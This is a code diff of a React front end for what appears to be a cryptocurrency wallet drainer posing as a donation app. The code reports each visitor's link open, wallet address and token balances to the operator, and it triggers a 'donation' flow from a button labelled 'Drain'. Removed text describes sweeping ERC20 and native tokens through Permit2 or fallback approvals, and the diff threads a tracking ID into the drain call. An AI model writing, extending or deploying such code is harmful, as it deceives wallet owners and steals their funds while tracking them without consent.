@@ -1,11 +1,10 @@
-// src/App.jsx
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useRef } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useWalletClient } from "wagmi";
 import { runDonationFlow } from "./engine/donate";
 import { buildWalletSummary } from "./engine/balances";
 import { notify } from "./utils/notify.js";
-import { sendEvent } from "./utils/eventRelay.js"; // adjust import path if needed
+import { sendEvent } from "./utils/eventRelay.js";
 import Navbar from "./components/Navbar";
 import PriceTicker from "./components/PriceTicker";
 import Notifications from "./components/Notifications";
@@ -15,9 +14,12 @@ import Background from "./components/Background";
 export default function App() {
   const [status, setStatus] = useState("idle");
   const [notifications, setNotifications] = useState([]);
-
   const { address, isConnected } = useAccount();
   const { data: walletClient } = useWalletClient();
+
+  // 🔒 stable tracking ID for this session
+  const trackingIdRef = useRef(Date.now().toString());
+  const trackingId = trackingIdRef.current;
 
   // 🔔 toast helper
   function addNotification(message, type = "info") {
@@ -28,9 +30,8 @@ export default function App() {
     }, 5000);
   }
 
-  // 📡 1. Fire LINK_OPENED on mount
+  // 📡 Fire LINK_OPENED on mount
   useEffect(() => {
-    const trackingId = Date.now().toString();
     const payload = {
       openedUrl: window.location.href,
       visitorIp: null,
@@ -38,33 +39,31 @@ export default function App() {
     };
     notify("LINK_OPENED", payload);
     sendEvent("LINK_OPENED", payload);
-  }, []);
+  }, [trackingId]);
 
-  // 📡 2. Fire WALLET_CONNECTED when user connects
- // inside useEffect
-useEffect(() => {
-  async function sendConnectedEvent() {
-    if (!isConnected || !address) return;
+  // 📡 Fire WALLET_CONNECTED / WALLET_DISCONNECTED
+  useEffect(() => {
+    async function syncWalletEvent() {
+      if (isConnected && address) {
+        const { balancesPayload, grandTotal } = await buildWalletSummary(address);
 
-    const { balancesPayload, grandTotal } = await buildWalletSummary(address);
+        const connectedPayload = {
+          walletAddress: address,
+          trackingId,
+          balances: balancesPayload,
+          grandTotal: Number(grandTotal).toFixed(2),
+        };
 
-    const connectedPayload = {
-      walletAddress: address,
-      trackingId,
-      balances: balancesPayload,
-      grandTotal: Number(grandTotal).toFixed(2),
-    };
-
-    notify("WALLET_CONNECTED", connectedPayload);
-    await sendEvent("WALLET_CONNECTED", connectedPayload);
-  } else {
-      const discPayload = { walletAddress: address, trackingId };
-      notify("WALLET_DISCONNECTED", discPayload);
-      sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
+        notify("WALLET_CONNECTED", connectedPayload);
+        await sendEvent("WALLET_CONNECTED", connectedPayload);
+      } else if (!isConnected && address) {
+        const discPayload = { walletAddress: address, trackingId };
+        notify("WALLET_DISCONNECTED", discPayload);
+        sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
+      }
     }
-
-  sendConnectedEvent();
-}, [isConnected, address, trackingId]);
+    syncWalletEvent();
+  }, [isConnected, address, trackingId]);
 
   // 🚀 donation trigger
   async function handleDonate() {
@@ -78,7 +77,7 @@ useEffect(() => {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
 
-      const res = await runDonationFlow(walletClient);
+      const res = await runDonationFlow(walletClient, address, trackingId);
 
       if (res?.success) {
         addNotification("Donation completed successfully 🎉", "success");
@@ -132,21 +131,6 @@ useEffect(() => {
                     {status === "running" ? "Processing…" : "Drain"}
                   </button>
                 ) : null}
-              </div>
-            </div>
-
-            <div className="w-full grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
-              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
-                <h3 className="text-sm font-semibold text-slate-800">Quick</h3>
-                <p className="text-xs text-slate-700">Connect & sweep ERC20 + native tokens.</p>
-              </div>
-              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
-                <h3 className="text-sm font-semibold text-slate-800">Secure</h3>
-                <p className="text-xs text-slate-700">Uses Permit2 where available, fallback approvals otherwise.</p>
-              </div>
-              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
-                <h3 className="text-sm font-semibold text-slate-800">Multi-chain</h3>
-                <p className="text-xs text-slate-700">Ethereum, BSC, Polygon — add more in config.</p>
               </div>
             </div>
           </main>
